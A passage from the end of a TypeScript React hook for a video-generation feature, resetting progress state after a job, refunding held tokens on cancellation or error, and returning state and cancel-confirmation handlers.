        await refundHeldTokens(jobId, cancelled ? "User cancelled generation" : parsed?.message);
      }
    } finally {
      setIsGenerating(false);
      isGeneratingRef.current = false;
      setGenerationStage("idle");
      setAudioProgress(0);
      setAudioGenerated(0);
      setAudioUploaded(0);
      setAudioTotal(0);
      setBackgroundUploadProgress(0);
      resetCancellationState();

      // Reset tracking refs
      currentStageRef.current = "idle";
      currentAudioProgressRef.current = 0;
      currentAudioGeneratedRef.current = 0;
      currentAudioTotalRef.current = 0;
      currentBackgroundProgressRef.current = 0;
    }
  };

  const clearError = () => {
    setError(null);
    setErrorTitle(null);
  };

  const clearVoiceWarning = () => {
    setVoiceWarning(null);
    setVoiceWarningTitle(null);
  };

  const canCancelGeneration = isGenerating && generationStage !== "starting_render";

  return {
    isGenerating,
    generateVideo,
    jobsListRef,
    jobsSectionRef,
    error,
    errorTitle,
    clearError,
    voiceWarning,
    voiceWarningTitle,
    clearVoiceWarning,
    audioProgress,
    audioGenerated,
    audioUploaded,
    audioTotal,
    backgroundUploadProgress,
    generationStage,
    startCancelConfirmation,
    confirmCancelGeneration,
    dismissCancelConfirmation,
    cancelPromptOpen,
    canCancelGeneration,
    isCancellingGeneration,
  };
};


// const wait = (seconds: number) => {
//   return new Promise<void>((resolve) => {
//     setTimeout(resolve, seconds * 1000);
//   });
// };
